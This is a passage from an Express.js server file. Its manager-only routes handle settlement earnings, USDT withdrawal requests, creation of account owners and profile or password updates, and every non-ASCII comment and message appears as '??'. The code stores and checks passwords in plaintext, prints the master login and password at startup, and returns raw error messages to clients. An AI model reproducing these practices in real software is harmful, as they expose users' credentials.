  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ========== ?? ?? ?? ?? ==========

// ?????????????????????????????????????????????
// ???? owner ????? ???? ?? API
// ?????????????????????????????????????????????

// GET /api/owner/mgr/settlements ? ?? ?? ?? (??? ??)
app.get('/api/owner/mgr/settlements', requireOwnerSession, async (req, res) => {
  if (req.owner.role !== 'manager') return res.status(403).json({ error: '??? ??' });
  try {
    const page     = Math.max(1, parseInt(req.query.page)     || 1);
    const pageSize = Math.min(50, parseInt(req.query.pageSize) || 20);
    const offset   = (page - 1) * pageSize;
    const mid = req.owner.id;
    const [[{ total }]] = await db.pool.query('SELECT COUNT(*) AS total FROM settlements WHERE manager_id = ?', [mid]);
    const [records]     = await db.pool.query(
      `SELECT user_id, payment_amount, settlement_rate, settlement_amount, payment_type, created_at
       FROM settlements WHERE manager_id = ? ORDER BY id DESC LIMIT ? OFFSET ?`,
      [mid, pageSize, offset]
    );
    const [[te]] = await db.pool.query('SELECT COALESCE(SUM(settlement_amount),0) AS v FROM settlements WHERE manager_id=?', [mid]);
    const [[tw]] = await db.pool.query("SELECT COALESCE(SUM(amount),0) AS v FROM withdrawal_requests WHERE manager_id=? AND status='approved'", [mid]);
    res.json({ records, total: Number(total), totalEarned: Number(te.v), totalWithdrawn: Number(tw.v), balance: Number(te.v) - Number(tw.v), page, pageSize });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// GET /api/owner/mgr/withdrawals ? ?? ?? ?? (??? ??)
app.get('/api/owner/mgr/withdrawals', requireOwnerSession, async (req, res) => {
  if (req.owner.role !== 'manager') return res.status(403).json({ error: '??? ??' });
  try {
    const [rows] = await db.pool.query(
      'SELECT id, amount, wallet_address, status, reject_reason, requested_at, processed_at FROM withdrawal_requests WHERE manager_id = ? ORDER BY requested_at DESC',
      [req.owner.id]
    );
    const [[te]] = await db.pool.query('SELECT COALESCE(SUM(settlement_amount),0) AS v FROM settlements WHERE manager_id=?', [req.owner.id]);
    const [[tw]] = await db.pool.query("SELECT COALESCE(SUM(amount),0) AS v FROM withdrawal_requests WHERE manager_id=? AND status='approved'", [req.owner.id]);
    res.json({ withdrawals: rows, balance: Number(te.v) - Number(tw.v) });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// POST /api/owner/mgr/withdrawals ? ?? ?? (??? ??)
app.post('/api/owner/mgr/withdrawals', requireOwnerSession, async (req, res) => {
  if (req.owner.role !== 'manager') return res.status(403).json({ error: '??? ??' });
  try {
    const { amount, wallet_address } = req.body || {};
    if (!amount || isNaN(amount) || Number(amount) <= 0) return res.status(400).json({ error: '??? ?????.' });
    const mid = req.owner.id;
    const [[te]] = await db.pool.query('SELECT COALESCE(SUM(settlement_amount),0) AS v FROM settlements WHERE manager_id=?', [mid]);
    const [[tw]] = await db.pool.query("SELECT COALESCE(SUM(amount),0) AS v FROM withdrawal_requests WHERE manager_id=? AND status IN ('approved','pending')", [mid]);
    const balance = Number(te.v) - Number(tw.v);
    if (Number(amount) > balance) return res.status(400).json({ error: `?? ?? ?? ?? (??: ${balance.toFixed(4)} USDT)` });
    await db.pool.query('INSERT INTO withdrawal_requests (manager_id, amount, wallet_address) VALUES (?, ?, ?)', [mid, Number(amount), wallet_address?.trim() || null]);
    res.json({ ok: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// GET /api/owner/mgr/owners ? ?? ?? ?? ?? (??? ??)
app.get('/api/owner/mgr/owners', requireOwnerSession, async (req, res) => {
  if (req.owner.role !== 'manager') return res.status(403).json({ error: '??? ??' });
  try {
    const [rows] = await db.pool.query(
      `SELECT o.id, o.name, o.telegram, o.status, o.created_at,
              COUNT(u.id) AS device_count
       FROM account_owners o LEFT JOIN users u ON u.owner_id = o.id
       WHERE o.manager_id = ?
       GROUP BY o.id ORDER BY o.id`,
      [req.owner.id]
    );
    res.json({ owners: rows });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// POST /api/owner/mgr/owners ? ? ?? ?? (??? ??? referral)
app.post('/api/owner/mgr/owners', requireOwnerSession, async (req, res) => {
  if (req.owner.role !== 'manager') return res.status(403).json({ error: '??? ??' });
  try {
    const { id, password, name, telegram } = req.body || {};
    if (!id?.trim() || !password?.trim()) return res.status(400).json({ error: 'ID? ????? ?????.' });
    const ownerId = id.trim().toLowerCase();
    const [[exists]] = await db.pool.query('SELECT id FROM account_owners WHERE id = ?', [ownerId]);
    if (exists) return res.status(400).json({ error: '?? ?? ?? ??????.' });
    await db.pool.query(
      'INSERT INTO account_owners (id, pw, name, telegram, manager_id, status) VALUES (?, ?, ?, ?, ?, ?)',
      [ownerId, password.trim(), name?.trim() || null, telegram?.trim() || null, req.owner.id, 'approved']
    );
    res.json({ ok: true, id: ownerId });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// PATCH /api/owner/me ? ??/??? ??? ?? ?? ??
app.patch('/api/owner/me', async (req, res) => {
  try {
    const authHeader = req.headers.authorization || '';
    const token = authHeader.startsWith('Bearer ') ? authHeader.slice(7) : '';
    if (!token) return res.status(401).json({ error: '?? ??' });
    const [[sess]] = await db.pool.query(
      'SELECT owner_id FROM owner_sessions WHERE token=?', [token]
    );
    if (!sess) return res.status(401).json({ error: '?? ??' });

    const ownerId = sess.owner_id;
    const { name, telegram, password, new_password } = req.body || {};

    // ???? ?? ? ?? ???? ??
    if (new_password?.trim()) {
      if (!password?.trim()) return res.status(400).json({ error: '?? ????? ?????.' });
      // account_owners ??
      const [[ownerRow]] = await db.pool.query('SELECT id FROM account_owners WHERE id=? AND pw=?', [ownerId, password.trim()]);
      const [[mgrRow]]   = await db.pool.query("SELECT id FROM managers WHERE id=? AND pw=? AND role='manager'", [ownerId, password.trim()]);
      if (!ownerRow && !mgrRow) return res.status(400).json({ error: '?? ????? ???? ????.' });

      if (ownerRow) {
        await db.pool.query('UPDATE account_owners SET pw=? WHERE id=?', [new_password.trim(), ownerId]);
      }
      if (mgrRow) {
        await db.pool.query("UPDATE managers SET pw=? WHERE id=? AND role='manager'", [new_password.trim(), ownerId]);
      }
    }

    // ??/???? ????
    const [[existsOwner]] = await db.pool.query('SELECT id FROM account_owners WHERE id=?', [ownerId]);
    if (existsOwner) {
      const fields = []; const vals = [];
      if (name     !== undefined) { fields.push('name=?');     vals.push(name||null); }
      if (telegram !== undefined) { fields.push('telegram=?'); vals.push(telegram||null); }
      if (fields.length) { vals.push(ownerId); await db.pool.query(`UPDATE account_owners SET ${fields.join(',')} WHERE id=?`, vals); }
    }
    // ???? ?? admins ??? telegram ????
    const [[existsMgr]] = await db.pool.query("SELECT id FROM managers WHERE id=? AND role='manager'", [ownerId]);
    if (existsMgr && telegram !== undefined) {
      await db.pool.query("UPDATE managers SET telegram=? WHERE id=? AND role='manager'", [telegram||null, ownerId]);
    }
    
    res.json({ ok: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ?? ??
app.listen(PORT, () => {
  console.log('????????????????????????????????????????');
  console.log('? ?? ?? ?!');
  console.log('');
  console.log('?? URL: http://localhost:' + PORT);
  console.log('?? ???: http://localhost:' + PORT + '/admin.html');
  console.log('?? ???: ' + MASTER_ID + ' / ' + MASTER_PW);
  console.log('?? ??????: MariaDB ???');
  console.log('????????????????????????????????????????');
});
